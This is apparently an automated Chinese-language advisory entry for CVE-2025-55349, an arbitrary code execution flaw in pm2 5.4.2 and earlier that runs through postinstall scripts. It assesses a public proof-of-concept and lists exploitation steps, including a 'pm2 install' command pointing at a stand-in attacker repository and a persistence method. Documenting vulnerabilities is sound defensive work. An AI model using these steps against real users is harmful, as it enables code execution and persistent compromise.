## CVE-2025-55349 - pm2 Arbitrary Code Execution

**漏洞编号:** CVE-2025-55349

**漏洞类型:** Arbitrary Code Execution

**影响应用:** pm2

**危害等级:** 高危，允许攻击者执行任意代码，可能导致系统完全控制

**影响版本:** <= 5.4.2

**利用条件:** 目标系统安装了易受攻击的pm2版本，且允许安装模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-55349 存在于 Unitech PM2 v5.4.2 的 `lib/API/Modules/NPM.js` 组件中。当 PM2 安装包含精心设计的 `postinstall` 脚本的包时，允许执行任意代码。

**有效性：**
提供的 POC 代码有效。它演示了如何创建一个恶意 Git 仓库，其中包含一个在安装时执行任意命令的 `postinstall` 脚本。通过 `pm2 install` 命令安装此恶意模块时，`postinstall` 脚本会自动执行，无需用户确认或沙箱隔离。

**投毒风险：**
根据提供的漏洞利用代码，该仓库中不存在作者隐藏的投毒代码。POC 提供的代码仅仅是为了演示该漏洞，并没有其他的恶意行为。风险为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `postinstall` 脚本的 Git 仓库。
2.  攻击者诱导受害者使用易受攻击的 PM2 版本 (<= 5.4.2) 从该 Git 仓库安装模块，方法是执行 `pm2 install https://github.com/attacker/malicious-module.git` 或使用本地文件路径。
3.  PM2 在安装过程中自动执行 `postinstall` 脚本，从而导致攻击者控制的代码在受害者系统上执行。
4.  由于 PM2 模块通常在系统启动时启动，因此攻击者可以通过将恶意模块注册为 PM2 启动模块来实现持久化。

**项目地址:** [GoldenTicketLabs/CVE-2025-55349](https://github.com/GoldenTicketLabs/CVE-2025-55349)

**漏洞详情:** [CVE-2025-55349](https://nvd.nist.gov/vuln/detail/CVE-2025-55349)